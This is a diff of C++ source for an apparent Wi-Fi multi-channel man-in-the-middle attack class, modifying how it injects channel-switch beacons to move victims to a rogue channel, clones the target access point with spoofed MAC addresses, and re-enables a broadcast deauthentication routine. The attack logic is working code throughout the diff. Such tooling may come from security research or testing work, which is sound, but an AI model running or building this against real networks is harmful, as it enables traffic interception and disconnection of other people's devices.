@@ -36,26 +36,29 @@ McMitm::McMitm(const ActorPtr &rogue_sta,
 
 McMitm::~McMitm(){ stop(); }
 
-void McMitm::send_csa_beacon(const int numpairs, const std::optional<HWAddress<6>> &target) const{
-    auto beacon_copy = std::unique_ptr<Dot11Beacon>(beacon->clone());
+void McMitm::send_csa_beacon(const int numpairs, const optional<HWAddress<6>> &target) const{
+    const auto  beacon_copy = unique_ptr<Dot11Beacon>(beacon->clone());
 
     if(target.has_value()) beacon_copy->addr1(*target);
 
-    const uint8_t new_channel = netconfig.rogue_channel;
     for(int i = 0; i < numpairs; ++i){
         //FIXME
-        CSA_attack::send_CSA_beacon(ap_mac, rogue_sta["iface"], ssid, netconfig.real_channel, new_channel);
+        const NetworkInterface iface(rogue_sta["iface"]);
+        CSA_attack::send_CSA_beacon(ap_mac, iface, ssid,
+            netconfig.real_channel,  netconfig.rogue_channel);
 
         // Intel firmware requires first receiving a CSA beacon with a count of 2 or higher,
         // followed by one with a value of 1. When starting with 1 it errors out.
-
-        /*auto csa2 = append_csa(*beacon_copy, new_channel, 2);
+        //TODO proč to nejde takhle? (asi jedno, ale bylo bylep39 vycházet z beacon_copy)
+        /*auto csa2 = append_csa(*beacon_copy, netconfig.rogue_channel, 2);
         sock_real->send(csa2, netconfig.real_channel);
 
-        auto csa1 = append_csa(*beacon_copy, new_channel, 1);
+        auto csa1 = append_csa(*beacon_copy, netconfig.rogue_channel, 1);
         sock_real->send(csa1, netconfig.real_channel);*/
+
+        this_thread::sleep_for(milliseconds(100)); //TODO from config
     }
-    log(LogLevel::INFO, "Injected {} CSA beacon pairs (moving stations to channel {})", numpairs, new_channel);
+    //log(LogLevel::INFO, "Injected {} CSA beacon pairs (moving stations to channel {})", numpairs, netconfig.rogue_channel);
 }
 
 void McMitm::send_disas(const HWAddress<6> &macaddr) const{
@@ -163,10 +166,6 @@ void McMitm::run(RunStatus &rs, const int timeout_sec){
     if(netconfig.real_channel > 13) log(LogLevel::WARNING, "Attack not yet tested against 5 GHz networks.");
     //netconfig.find_rogue_channel(); //TODO
 
-    /*         CSA_attack::check_vulnerable(
-     ap_mac, client_mac,
-     rogue_sta["iface"], ssid,
-     netconfig.real_channel , netconfig.rogue_channel, 100, 7);*/
 
     // Get a probe response we can reuse to instantly reply to probe requests
     if(auto *ch_ie = beacon->search_option(Dot11ManagementFrame::DS_SET))
@@ -182,10 +181,10 @@ void McMitm::run(RunStatus &rs, const int timeout_sec){
         rogue_sta->set_mac_address(client_mac.to_string());
         start_ap(rs, nic_real_ap, rogue_sta, netconfig.real_channel, *beacon, client_mac.to_string());
     } else{
-        log(LogLevel::INFO, "Setting MAC address of {} to {}", rogue_sta["iface"],
-            client_mac.to_string().c_str());
         hw_capabilities::set_iface_down(nic_real_ap, rogue_sta->str_con.at("netns"));
         rogue_sta->set_mac_address(client_mac.to_string());
+        hw_capabilities::run_cmd({"iw", rogue_sta["iface"], "set", "monitor", "active"}, rogue_sta->str_con.at("netns"));
+        this_thread::sleep_for(seconds(15));
         rogue_sta->run({"iw", "dev", rogue_sta["iface"], "set", "channel", to_string(netconfig.real_channel)});
     }
     rogue_sta->set_iface_up();
@@ -199,11 +198,12 @@ void McMitm::run(RunStatus &rs, const int timeout_sec){
     sock_real->set_filter(bpf);
 
     // 3. Set up the rogue AP and interfaces
-    log(LogLevel::INFO, "Setting MAC address of {} to {}", nic_rogue_ap, ap_mac);
+    log(LogLevel::INFO, "Setting MAC address of {} to {}", nic_rogue_ap, ap_mac.to_string());
     rogue_ap->set_iface_up();
     rogue_ap->set_mac_address(ap_mac.to_string());
     // Set up a rogue AP that clones the target network
     start_ap(rs, nic_rogue_ap, rogue_ap, netconfig.rogue_channel, *beacon, ap_mac.to_string());
+    //hw_capabilities::run_cmd({"iw", "dev", nic_real_ap, "station", "add", client_mac.to_string()}, rogue_sta->str_con.at("netns"), false);
 
     sock_rogue = make_unique<MonitorSocket>(rogue_ap["iface"]);
     sock_rogue->set_filter(bpf);
@@ -214,7 +214,7 @@ void McMitm::run(RunStatus &rs, const int timeout_sec){
     // 4 Inject some CSA beacons to push victims to our channel
     send_csa_beacon(4);
 
-    /*Dot11Deauthentication deauth{};
+    Dot11Deauthentication deauth{};
     deauth.addr1(HWAddress<6>::broadcast);
     deauth.addr2(ap_mac);
     deauth.addr3(ap_mac);
@@ -268,7 +268,7 @@ void McMitm::run(RunStatus &rs, const int timeout_sec){
             log(LogLevel::WARNING, "WARNING: Didn't receive beacon from rogue AP for two seconds");
             last_rogue_beacon = steady_clock::now();
         }
-    }*/
+    }
 }
 
 void McMitm::stop(){
@@ -449,7 +449,7 @@ void McMitm::handle_rx_real_chan(){
 }
 
 void McMitm::handle_rx_rogue_chan(){
-    auto pdu = sock_rogue->recv();
+    const auto pdu = sock_rogue->recv();
     if(!pdu) return;
 
     const auto *dot11 = pdu->find_pdu<Dot11>();
